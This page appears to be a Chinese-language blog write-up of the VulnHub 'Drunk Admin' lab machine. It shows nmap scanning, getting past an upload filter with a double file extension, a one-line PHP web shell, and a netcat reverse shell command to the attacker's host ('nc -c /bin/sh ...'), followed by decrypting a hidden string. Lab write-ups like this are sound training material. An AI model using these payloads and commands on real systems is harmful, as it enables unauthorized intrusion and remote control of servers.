@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Drunk_admin_hacking_challenge - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="Drunk_admin_hacking_challenge">
+<meta itemprop="description" content="靶机介绍 该靶机获取隐藏信息类型的靶机，最终目的获取到一个坐标地址，不需要提权（我也没尝试去提权）。 靶场地址 https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip
+靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 查看存活地址 nmap -sn 10.10.10.*
+靶机ip地址为 10.10.10.131 探测开放端口 nmap -p- -sV 10.10.10.131
+开放的端口为22,8880 使用浏览器访问8880 http://10.10.10.131:8880/
+存在上传点 先看看其他信息，点击info
+没有什么有用的信息，下面的PHP点击会跳转到PHPinfo的地址
+http://10.10.10.131:8880/myphp.php?id=102 http://10.10.10.131:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 尝试遍历id参数0-999
+都是PHPinfo信息
+漏洞利用 上传点利用 尝试利用上传点，先上传一个普通的图片
+上传完成获得一个跳转的数据包
+得到图片地址 http://10.10.10.131:8880/images/72f2517fb0057efa7751d3eb59aa09b6.jpeg
+看到图片名和上个包的cookie中trypios字段相同
+上传木马尝试 首先将正常图片的后缀改成php
+有后缀限制 随便输入一个不存在的后缀名
+可能为白名单限制，继续尝试 在原有的图片后缀名上添加其他后缀内容如后面加.php
+上传成功，可能代码只判断字符串中是否存在jpg等图片格式的字符串 上传小马 失败了，不知道是对文件头进行判断，还是文件内容 尝试随便上传内容
+上传成功，访问上面md5值拼接的地址
+不能访问，可能是对木马中的某个关键字进行了限制 删除每一个字符串，尝试 删除system，上传不成功 删除$_GET，尝试上传 上传成功，看起来是_GET被加入到了黑名单 更改木马内容为 &lt;?php system($_REQUEST[&#39;cmd&#39;])?&gt; 上传成功但是木马不能执行 换个其他内容的木马继续尝试
+上传成功 尝试访问执行木马 http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=whoami
+获取信息 反弹shell 靶机上存在nc工具，直接使用nc进行反弹 命令为
+本地开启端口进行监听 nc -lvvp 8080 远程执行命令 nc -c /bin/sh 10.">
+<meta itemprop="datePublished" content="2019-11-04T21:37:38&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-04T21:37:38&#43;08:00" />
+<meta itemprop="wordCount" content="106">
+
+
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="Drunk_admin_hacking_challenge" />
+<meta property="og:description" content="靶机介绍 该靶机获取隐藏信息类型的靶机，最终目的获取到一个坐标地址，不需要提权（我也没尝试去提权）。 靶场地址 https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip
+靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 查看存活地址 nmap -sn 10.10.10.*
+靶机ip地址为 10.10.10.131 探测开放端口 nmap -p- -sV 10.10.10.131
+开放的端口为22,8880 使用浏览器访问8880 http://10.10.10.131:8880/
+存在上传点 先看看其他信息，点击info
+没有什么有用的信息，下面的PHP点击会跳转到PHPinfo的地址
+http://10.10.10.131:8880/myphp.php?id=102 http://10.10.10.131:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 尝试遍历id参数0-999
+都是PHPinfo信息
+漏洞利用 上传点利用 尝试利用上传点，先上传一个普通的图片
+上传完成获得一个跳转的数据包
+得到图片地址 http://10.10.10.131:8880/images/72f2517fb0057efa7751d3eb59aa09b6.jpeg
+看到图片名和上个包的cookie中trypios字段相同
+上传木马尝试 首先将正常图片的后缀改成php
+有后缀限制 随便输入一个不存在的后缀名
+可能为白名单限制，继续尝试 在原有的图片后缀名上添加其他后缀内容如后面加.php
+上传成功，可能代码只判断字符串中是否存在jpg等图片格式的字符串 上传小马 失败了，不知道是对文件头进行判断，还是文件内容 尝试随便上传内容
+上传成功，访问上面md5值拼接的地址
+不能访问，可能是对木马中的某个关键字进行了限制 删除每一个字符串，尝试 删除system，上传不成功 删除$_GET，尝试上传 上传成功，看起来是_GET被加入到了黑名单 更改木马内容为 &lt;?php system($_REQUEST[&#39;cmd&#39;])?&gt; 上传成功但是木马不能执行 换个其他内容的木马继续尝试
+上传成功 尝试访问执行木马 http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=whoami
+获取信息 反弹shell 靶机上存在nc工具，直接使用nc进行反弹 命令为
+本地开启端口进行监听 nc -lvvp 8080 远程执行命令 nc -c /bin/sh 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/drunk_admin_hacking_challenge/" />
+<meta property="article:published_time" content="2019-11-04T21:37:38+08:00" />
+<meta property="article:modified_time" content="2019-11-04T21:37:38+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Drunk_admin_hacking_challenge"/>
+<meta name="twitter:description" content="靶机介绍 该靶机获取隐藏信息类型的靶机，最终目的获取到一个坐标地址，不需要提权（我也没尝试去提权）。 靶场地址 https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip
+靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 查看存活地址 nmap -sn 10.10.10.*
+靶机ip地址为 10.10.10.131 探测开放端口 nmap -p- -sV 10.10.10.131
+开放的端口为22,8880 使用浏览器访问8880 http://10.10.10.131:8880/
+存在上传点 先看看其他信息，点击info
+没有什么有用的信息，下面的PHP点击会跳转到PHPinfo的地址
+http://10.10.10.131:8880/myphp.php?id=102 http://10.10.10.131:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 尝试遍历id参数0-999
+都是PHPinfo信息
+漏洞利用 上传点利用 尝试利用上传点，先上传一个普通的图片
+上传完成获得一个跳转的数据包
+得到图片地址 http://10.10.10.131:8880/images/72f2517fb0057efa7751d3eb59aa09b6.jpeg
+看到图片名和上个包的cookie中trypios字段相同
+上传木马尝试 首先将正常图片的后缀改成php
+有后缀限制 随便输入一个不存在的后缀名
+可能为白名单限制，继续尝试 在原有的图片后缀名上添加其他后缀内容如后面加.php
+上传成功，可能代码只判断字符串中是否存在jpg等图片格式的字符串 上传小马 失败了，不知道是对文件头进行判断，还是文件内容 尝试随便上传内容
+上传成功，访问上面md5值拼接的地址
+不能访问，可能是对木马中的某个关键字进行了限制 删除每一个字符串，尝试 删除system，上传不成功 删除$_GET，尝试上传 上传成功，看起来是_GET被加入到了黑名单 更改木马内容为 &lt;?php system($_REQUEST[&#39;cmd&#39;])?&gt; 上传成功但是木马不能执行 换个其他内容的木马继续尝试
+上传成功 尝试访问执行木马 http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=whoami
+获取信息 反弹shell 靶机上存在nc工具，直接使用nc进行反弹 命令为
+本地开启端口进行监听 nc -lvvp 8080 远程执行命令 nc -c /bin/sh 10."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">04</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">Drunk_admin_hacking_challenge</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>该靶机获取隐藏信息类型的靶机，最终目的获取到一个坐标地址，不需要提权（我也没尝试去提权）。
+靶场地址
+<code>https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip</code></p>
+<h3 id="靶机运行">靶机运行</h3>
+<p>直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式</p>
+<h3 id="信息收集">信息收集</h3>
+<p>查看存活地址
+<code>nmap -sn 10.10.10.*</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/ec061296f22335c167ce0f101d04caa6.png" alt="ec061296f22335c167ce0f101d04caa6.png"></p>
+<p>靶机ip地址为 <code>10.10.10.131</code>
+探测开放端口
+<code>nmap -p- -sV 10.10.10.131</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/204973ef0ff9ab12a4e782f47207c043.png" alt="204973ef0ff9ab12a4e782f47207c043.png"></p>
+<p>开放的端口为<code>22,8880</code>
+使用浏览器访问<code>8880</code>
+<code>http://10.10.10.131:8880/</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/86a10ea53e2c31c161f56f774e430bb7.png" alt="86a10ea53e2c31c161f56f774e430bb7.png"></p>
+<p>存在上传点
+先看看其他信息，点击info</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/265e4bdcaa8f1e3b18786c0808ef3877.png" alt="265e4bdcaa8f1e3b18786c0808ef3877.png"></p>
+<p>没有什么有用的信息，下面的PHP点击会跳转到PHPinfo的地址</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://10.10.10.131:8880/myphp.php?id=102
+http://10.10.10.131:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+</code></pre></div><p><img src="/images/2019/drunk_admin_hacking_challenge/0090931c1106a7b5e326f867f445a751.png" alt="0090931c1106a7b5e326f867f445a751.png"></p>
+<p>尝试遍历id参数0-999</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/70a79f4c5f7e7a087ace0fadbfa1ce99.png" alt="70a79f4c5f7e7a087ace0fadbfa1ce99.png"></p>
+<p>都是PHPinfo信息</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>上传点利用
+尝试利用上传点，先上传一个普通的图片</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/18355a0f790731182ec24278c50aa5a4.png" alt="18355a0f790731182ec24278c50aa5a4.png"></p>
+<p>上传完成获得一个跳转的数据包</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/95da1ec041fa169b2fc7d9a8a13d9b08.png" alt="95da1ec041fa169b2fc7d9a8a13d9b08.png"></p>
+<p>得到图片地址
+<code>http://10.10.10.131:8880/images/72f2517fb0057efa7751d3eb59aa09b6.jpeg</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/a70dafd8401a2d3998d3ec8ba27fd49e.png" alt="a70dafd8401a2d3998d3ec8ba27fd49e.png"></p>
+<p>看到图片名和上个包的cookie中trypios字段相同</p>
+<p>上传木马尝试
+首先将正常图片的后缀改成php</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/2780a9da4330b9f42d1ddcac3a38d472.png" alt="2780a9da4330b9f42d1ddcac3a38d472.png"></p>
+<p>有后缀限制
+随便输入一个不存在的后缀名</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/04f133afe73604444a88a904afe283e3.png" alt="04f133afe73604444a88a904afe283e3.png"></p>
+<p>可能为白名单限制，继续尝试
+在原有的图片后缀名上添加其他后缀内容如后面加.php</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/f0f4a4a6903f47bdc062cc4151ac5c09.png" alt="f0f4a4a6903f47bdc062cc4151ac5c09.png"></p>
+<p>上传成功，可能代码只判断字符串中是否存在jpg等图片格式的字符串
+上传小马 </p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/bcaa6bb6da21053e82656c67e365ad96.png" alt="bcaa6bb6da21053e82656c67e365ad96.png"></p>
+<p>失败了，不知道是对文件头进行判断，还是文件内容
+尝试随便上传内容</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/1a2f7b79022e9ffa1e673a0dc48f9ed7.png" alt="1a2f7b79022e9ffa1e673a0dc48f9ed7.png"></p>
+<p>上传成功，访问上面md5值拼接的地址</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/da4d6521423dfe0b03d6fc4880f065b8.png" alt="da4d6521423dfe0b03d6fc4880f065b8.png"></p>
+<p>不能访问，可能是对木马中的某个关键字进行了限制
+删除每一个字符串，尝试
+删除system，上传不成功
+删除<code>$_GET</code>，尝试上传
+上传成功，看起来是<code>_GET</code>被加入到了黑名单
+更改木马内容为
+<code>&lt;?php system($_REQUEST['cmd'])?&gt;</code>
+上传成功但是木马不能执行
+换个其他内容的木马继续尝试</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/e39dc923d6d3670a3ce325a579baaff9.png" alt="e39dc923d6d3670a3ce325a579baaff9.png"></p>
+<p>上传成功
+尝试访问执行木马
+<code>http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=whoami</code></p>
+<h3 id="获取信息">获取信息</h3>
+<p>反弹shell
+靶机上存在nc工具，直接使用nc进行反弹
+命令为</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">本地开启端口进行监听
+nc -lvvp 8080
+远程执行命令
+nc -c /bin/sh 10.10.10.132 8888
+</code></pre></div><p>访问链接执行反弹命令
+<code>http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=nc%20-c%20%2Fbin%2Fsh%2010.10.10.132%208888</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/91830e2645c0b4a2e8d9f9c29afc2382.png" alt="91830e2645c0b4a2e8d9f9c29afc2382.png"></p>
+<p>反弹成功
+查看当前位置</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/7b6c036ff2df3854192493520eaeb3dd.png" alt="7b6c036ff2df3854192493520eaeb3dd.png"></p>
+<p>查看一下当前位置的文件</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/8a161cea64e9a076250a6d49c6d4fee7.png" alt="8a161cea64e9a076250a6d49c6d4fee7.png"></p>
+<p>没什么东西，为保存上传文件的路径
+进入上一层目录
+使用ls -all查看所有文件</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/98292a843c5edf2b9b691643a873ad34.png" alt="98292a843c5edf2b9b691643a873ad34.png"></p>
+<p>发现一个特殊的隐藏文件
+cat .proof查看</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/f28561b4f33fe48a5ffa416ddf371455.png" alt="f28561b4f33fe48a5ffa416ddf371455.png"></p>
+<p>有些奇怪的内容，其中TGglMUxecjJDSDclN1Ej看起来像base64,解密为Lh%1L^r2CH7%7Q#，没看出来是什么东西
+继续去查看其他内容，先去/home下看看有什么用户</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/8bd4e69855771b92e00ac16eaf098646.png" alt="8bd4e69855771b92e00ac16eaf098646.png"></p>
+<p>发现/home/下有bob用户，其中存在几个PHP文件，查看其中一个文件内容
+<code>cat aes.class.php</code></p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/93bca56aabebee6cd0584c3e19531e38.png" alt="93bca56aabebee6cd0584c3e19531e38.png"></p>
+<p>看起来像加解密的脚本文件，上面得到的一串乱码可能为加密字符串
+将文件下php脚本相关内容复制到http路径的images目录中</p>
+<p><code>cp -rf /home/bob/public_html/* /var/www/images</code>
+查看目录</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/a49858897f6f1dea4aa3ab0872c64a08.png" alt="a49858897f6f1dea4aa3ab0872c64a08.png"></p>
+<p>复制成功
+访问链接</p>
+<p><code>http://10.10.10.131:8880/images/index.php</code>
+<img src="/images/2019/drunk_admin_hacking_challenge/65a2f6620710a248125c71292d735902.png" alt="65a2f6620710a248125c71292d735902.png"></p>
+<p>发现返回这个错误页面
+感觉应该是因为cookie或者是referer不存在导致，顺手添加referer发现还是返回该页面
+于是添加Cookie: trypios=uploader，访问</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/1e297d3fdde910d8b3834d4facbbae22.png" alt="1e297d3fdde910d8b3834d4facbbae22.png"></p>
+<p>成功访问，尝试将base64解码后的字符串输入进去</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/920f036999ee0300c00b91ee9a9b4e9d.png" alt="920f036999ee0300c00b91ee9a9b4e9d.png"></p>
+<p>成功解密，获得坐标位置，Google一下~</p>
+<p><img src="/images/2019/drunk_admin_hacking_challenge/cd39437c6e127841e1232d4d3991b6b0.png" alt="cd39437c6e127841e1232d4d3991b6b0.png"></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
